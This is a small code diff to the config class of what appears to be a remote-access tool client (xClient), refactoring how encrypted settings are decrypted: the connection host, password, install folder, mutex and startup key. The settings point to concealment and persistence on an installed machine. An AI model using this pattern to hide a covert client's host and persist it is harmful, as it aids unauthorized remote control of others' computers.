@@ -48,13 +48,14 @@ namespace xClient.Config
 
         public static void Initialize()
         {
-            VERSION = AES.Decrypt(VERSION, ENCRYPTIONKEY);
-            HOST = AES.Decrypt(HOST, ENCRYPTIONKEY);
-            PASSWORD = AES.Decrypt(PASSWORD, ENCRYPTIONKEY);
-            SUBFOLDER = AES.Decrypt(SUBFOLDER, ENCRYPTIONKEY);
-            INSTALLNAME = AES.Decrypt(INSTALLNAME, ENCRYPTIONKEY);
-            MUTEX = AES.Decrypt(MUTEX, ENCRYPTIONKEY);
-            STARTUPKEY = AES.Decrypt(STARTUPKEY, ENCRYPTIONKEY);
+            AES.PreHashKey(ENCRYPTIONKEY);
+            VERSION = AES.Decrypt(VERSION);
+            HOST = AES.Decrypt(HOST);
+            PASSWORD = AES.Decrypt(PASSWORD);
+            SUBFOLDER = AES.Decrypt(SUBFOLDER);
+            INSTALLNAME = AES.Decrypt(INSTALLNAME);
+            MUTEX = AES.Decrypt(MUTEX);
+            STARTUPKEY = AES.Decrypt(STARTUPKEY);
         }
 #endif
     }
